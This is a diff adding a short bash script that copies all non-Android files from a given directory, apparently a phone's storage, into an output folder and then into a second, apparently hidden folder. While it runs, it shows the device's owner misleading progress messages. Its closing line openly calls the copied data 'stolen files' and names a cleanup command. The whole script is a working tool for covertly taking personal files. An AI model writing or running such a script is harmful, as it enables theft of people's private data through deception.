@@ -1,0 +1,25 @@
+#!/usr/bin/bash
+
+hidedir=$3
+
+outdir=$2
+
+cd "$1"
+
+list=`ls | grep -v Android`
+echo 'While process DO NOT TURN PHONE OFF!!!'
+echo 'Now REAL work was begin (~20-90 min)'
+
+mkdir -p $outdir
+
+for i in $list
+ do
+  cp -R  $i $outdir
+ done
+cd 
+echo 'A half of work was done..., go show result....'
+mkdir $hidedir
+cp -R $outdir $hidedir
+
+echo 'Work done. Execute "chistka" to clear stolen files'
+
